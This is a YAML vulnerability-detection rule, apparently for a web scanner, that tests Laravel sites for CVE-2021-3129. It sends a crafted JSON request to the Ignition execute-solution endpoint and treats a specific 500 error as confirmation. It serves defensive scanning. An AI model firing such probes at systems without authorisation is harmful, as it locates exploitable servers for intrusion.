name: poc-yaml-laravel-cve-2021-3129
rules:
  - method: POST
    path: /_ignition/execute-solution
    follow_redirects: false
    headers:
      Content-Type: application/json
    body: >-
      {
        "solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters":{"variableName":"username","viewFile":"xxxx"}
      }
    expression: >
      response.status == 500 && response.body.bcontains(b'file_get_contents(xxxx)')
detail:
  author: HWHXY
  links:
    - https://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129
    - https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g
